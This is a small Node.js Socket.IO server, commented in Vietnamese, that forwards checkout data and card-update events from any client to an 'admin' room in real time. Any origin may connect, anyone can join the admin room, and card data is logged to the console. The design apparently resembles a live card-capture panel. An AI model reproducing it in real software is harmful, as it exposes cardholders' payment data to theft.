import { createServer } from 'http';
import { Server } from 'socket.io';

const httpServer = createServer();

const io = new Server(httpServer, {
    cors: {
        origin: '*',
        methods: ['GET', 'POST']
    }
});

// Xử lý kết nối Socket.IO
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // Join vào room admin để nhận thông báo
    socket.on('join-admin', () => {
        socket.join('admin');
        console.log('Admin joined room');
    });

    // Xử lý khi có dữ liệu checkout mới
    socket.on('checkout-data', (data) => {
        console.log('Received checkout data:', data);
        // Gửi dữ liệu đến tất cả admin
        io.to('admin').emit('new-checkout', data);
    });

    // Xử lý khi có thay đổi thông tin thẻ
    socket.on('card-update', (data) => {
        console.log('Received card update:', data);
        // Gửi cập nhật đến tất cả admin
        io.to('admin').emit('card-updated', data);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
    });
});

const PORT = process.env.SOCKET_PORT || 3001;

httpServer.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
    console.log(`Server URL: http://localhost:${PORT}`);
});
